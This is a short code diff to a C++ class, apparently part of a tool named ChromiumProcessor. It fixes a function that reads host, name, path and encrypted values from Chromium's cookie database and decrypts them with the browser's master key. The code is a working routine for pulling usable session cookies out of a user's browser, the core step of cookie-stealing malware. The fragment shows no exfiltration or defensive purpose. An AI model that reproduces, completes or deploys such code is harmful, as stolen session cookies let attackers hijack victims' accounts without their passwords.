@@ -126,7 +126,7 @@ int ChromiumProcessor::ExtractChromiumCookies()
         this->ExtractChromiumMasterKey();
     }
 
-    string sql="SELECT HOST_KEY, path, encrypted_value FROM cookies";
+    string sql="SELECT host_key, name, path, encrypted_value FROM cookies";
     sqlite3_stmt *pStmt;
 
     int rc;
@@ -142,13 +142,14 @@ int ChromiumProcessor::ExtractChromiumCookies()
     {
         Cookie newCookie;
         newCookie.Host=string((char *)sqlite3_column_text(pStmt, 0));
-        newCookie.Path=string((char *)sqlite3_column_text(pStmt, 0));
+        newCookie.Name=string((char *)sqlite3_column_text(pStmt, 1));
+        newCookie.Path=string((char *)sqlite3_column_text(pStmt, 2));
 
         DATA_BLOB encryptedCookie;
 
-        encryptedCookie.cbData=sqlite3_column_bytes(pStmt, 2);
+        encryptedCookie.cbData=sqlite3_column_bytes(pStmt, 3);
         encryptedCookie.pbData=new unsigned char[encryptedCookie.cbData];
-        memcpy(encryptedCookie.pbData, sqlite3_column_blob(pStmt, 2), encryptedCookie.cbData);
+        memcpy(encryptedCookie.pbData, sqlite3_column_blob(pStmt, 3), encryptedCookie.cbData);
 
         newCookie.Value=EasyDecrypt(&encryptedCookie, MasterKey);
         if(newCookie.Value==string(""))
